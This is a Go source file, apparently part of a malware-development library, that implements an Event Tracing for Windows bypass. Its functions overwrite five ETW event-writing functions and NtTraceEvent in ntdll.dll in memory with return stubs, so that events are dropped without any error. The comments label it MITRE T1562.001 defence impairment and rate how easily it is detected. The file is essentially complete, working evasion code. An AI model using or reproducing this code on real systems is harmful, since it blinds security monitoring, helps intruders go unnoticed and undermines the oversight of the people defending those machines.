//go:build windows

// Package etw provides ETW (Event Tracing for Windows) bypass techniques.
//
// Technique: Runtime patching of ntdll ETW event writing functions.
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
// Detection: Medium — patches ntdll.dll in-memory, detectable by integrity checks.
//
// The patch overwrites function entries with: xor rax, rax; ret (48 33 C0 C3)
// This makes all ETW event writes silently succeed without logging anything.
package etw

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// patch is the x64 stub: XOR RAX,RAX; RET — makes function return STATUS_SUCCESS.
var patch = []byte{0x48, 0x33, 0xC0, 0xC3}

// patchProc overwrites a proc's entry point with the NOP patch.
func patchProc(proc *windows.LazyProc) error {
	if err := proc.Find(); err != nil {
		return fmt.Errorf("find %s: %w", proc.Name, err)
	}
	addr := proc.Addr()
	var oldProtect uint32
	size := uintptr(len(patch))
	if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect %s: %w", proc.Name, err)
	}
	var written uintptr
	currentProcess, _ := windows.GetCurrentProcess()
	if err := windows.WriteProcessMemory(currentProcess, addr, &patch[0], size, &written); err != nil {
		return fmt.Errorf("WriteProcessMemory %s: %w", proc.Name, err)
	}
	windows.VirtualProtect(addr, size, oldProtect, &oldProtect)
	return nil
}

// PatchETW patches all 5 ETW event writing functions in ntdll.dll:
//   - EtwEventWrite
//   - EtwEventWriteEx
//   - EtwEventWriteFull
//   - EtwEventWriteString
//   - EtwEventWriteTransfer
//
// Each function is overwritten with XOR RAX,RAX; RET so it returns
// STATUS_SUCCESS without writing any event.
func PatchETW() error {
	procs := []*windows.LazyProc{
		api.ProcEtwEventWrite,
		api.ProcEtwEventWriteEx,
		api.ProcEtwEventWriteFull,
		api.ProcEtwEventWriteString,
		api.ProcEtwEventWriteTransfer,
	}
	for _, proc := range procs {
		if err := patchProc(proc); err != nil {
			return err
		}
	}
	return nil
}

// PatchNtTraceEvent patches NtTraceEvent in ntdll.dll with a single RET (0xC3).
// This is a lower-level function used by some ETW providers.
func PatchNtTraceEvent() error {
	proc := api.Ntdll.NewProc("NtTraceEvent")
	if err := proc.Find(); err != nil {
		return nil // not present
	}
	addr := proc.Addr()
	var oldProtect uint32
	if err := windows.VirtualProtect(addr, 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect NtTraceEvent: %w", err)
	}
	*(*byte)(unsafe.Pointer(addr)) = 0xC3 // RET
	windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
	return nil
}
